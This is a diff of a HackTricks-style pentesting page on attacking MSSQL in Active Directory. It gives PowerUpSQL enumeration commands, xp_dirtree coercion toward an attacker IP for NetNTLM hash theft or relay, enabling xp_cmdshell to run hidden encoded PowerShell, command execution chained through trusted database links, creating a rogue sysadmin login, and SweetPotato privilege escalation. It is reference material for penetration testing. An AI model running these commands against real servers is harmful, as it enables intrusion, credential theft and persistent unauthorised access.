@@ -1,4 +1,4 @@
-# MSSQL Trusted Links
+# MSSQL AD Abuse
 
 <details>
 
@@ -16,19 +16,18 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-## MSSQL Trusted Links
+## **MSSQL Enumeration / Discovery**
 
-If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA).\
-Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is very useful in this case.
 
-**The links between databases work even across forest trusts.**
-
-### **Powershell**
-
-```bash
+```powershell
 Import-Module .\PowerupSQL.psd1
+```
 
-#Get local MSSQL instance (if any)
+### Enumerating from the network without domain session
+
+```powershell
+# Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
 
@@ -39,8 +38,15 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
+```
 
-# FROM INSIDE OF THE DOMAIN
+### Enumerating from inside the domain
+
+```powershell
+# Get local MSSQL instance (if any)
+Get-SQLInstanceLocal
+Get-SQLInstanceLocal | Get-SQLServerInfo
+
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 
@@ -51,9 +57,71 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
 #Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
+# Get DBs, test connections and get info in oneliner
+Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
+```
+
+## MSSQL Basic Abuse
+
+### Access DB
+
+```powershell
+#Perform a SQL query
+Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
+
 #Dump an instance (a lotof CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
+```
 
+### MSSQL xp\_dirtree abuse
+
+Executing something such as `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` will make the MSSQL server to **login** to the specified **IP address**.
+
+### Steal NetNTLM hash / Relay attack
+
+Using **`xp_dirtree`** it's possible to **force** a NTLM **authentication**, therefore it's possible to **steal** the NetNTLM **hash** or even perform a **relay attack**.
+
+Using tools such as **responder** or **Inveigh** it's possible to **steal the NetNTLM hash**.\
+You can see how to use these tools in:
+
+{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
+[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
+{% endcontent-ref %}
+
+### MSSQL RCE
+
+It might be also possible to **execute commands** inside the MSSQL host
+
+```powershell
+Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
+```
+
+If **manually** you could just use:&#x20;
+
+<pre class="language-sql"><code class="lang-sql"><strong>#To enumerate the current state of xp_cmdshell
+</strong>SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
+# A value of 0 shows that xp_cmdshell is disabled. To enable it:
+sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Execute
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -w hidden -enc &#x3C;blah>';</code></pre>
+
+### MSSQL Extra
+
+{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server.md" %}
+[pentesting-mssql-microsoft-sql-server.md](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server.md)
+{% endcontent-ref %}
+
+## MSSQL Trusted Links
+
+If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+
+**The links between databases work even across forest trusts.**
+
+### Powershell Abuse
+
+```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -90,41 +158,65 @@ Notice that metasploit will try to abuse only the `openquery()` function in MSSQ
 
 ### Manual - Openquery()
 
-From Linux you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py** and run queries like:
+From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
 
-```bash
-select * from openquery("DOMINIO\SERVER1",'select * from openquery("DOMINIO\SERVER2",''select * from master..sysservers'')')
-```
-
-From Windows you could also find the links and execute commands manually using a MSSQL client like [HeidiSQL](https://www.heidisql.com)
+From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)****
 
 _Login using Windows authentication:_
 
 ![](<../../.gitbook/assets/image (167) (1).png>)
 
-_Find links inside the accessible MSSQL server (in this case the link is to dcorp-sql1):_\
-\_\_`select * from master..sysservers`
+#### Find Trustable Links
+
+```sql
+select * from master..sysservers
+```
 
 ![](<../../.gitbook/assets/image (168).png>)
 
-Execute queries through the link (example: find more links in the new accessible instance):\
-`select * from openquery("dcorp-sql1", 'select * from master..sysservers')`
+#### Execute queries in trustable link
+
+Execute queries through the link (example: find more links in the new accessible instance):
+
+```sql
+select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+```
+
+{% hint style="warning" %}
+Check where double and single quotes are used, it's important to use them that way.
+{% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
 
 You can continue these trusted links chain forever manually.
 
-Some times you won't be able to perform actions like `exec xp_cmdshell` from `openquery()` in those cases it might be worth it to test the following method:
+```sql
+# First level RCE
+SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
+
+# Second level RCE
+SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
+```
+
+If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
 
 ### Manual - EXECUTE
 
-You can also abuse trusted links using EXECUTE:
+You can also abuse trusted links using `EXECUTE`:
 
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
+
+## Local Privilege Escalation
+
+The **MSSQL local user** usually has a special type of privilege called **`SeImpersonatePrivilege`**. This allows the account to "impersonate a client after authentication".
+
+A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
+
+[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.
 
 <details>
 
